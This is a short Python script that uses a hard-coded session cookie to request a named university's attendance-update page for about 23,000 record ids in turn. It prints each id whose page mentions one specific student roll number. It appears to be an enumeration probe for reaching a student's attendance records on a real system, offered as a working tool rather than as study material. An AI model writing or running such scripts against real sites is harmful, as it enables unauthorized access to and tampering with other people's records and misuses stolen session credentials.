import requests

cookie = dict(PHPSESSID='lgnitm3rp01hsah96jebc0glu5')


url = 'http://mis.itmuniversity.ac.in/itmzone/module/StudentAttandance/updateAttandance.php?cid={0}'

for i in range(117070,139995):
    r = requests.get(url.format(i), cookies=cookie)
    if 'BETN1CS14053' in r.text:
        print(i)
        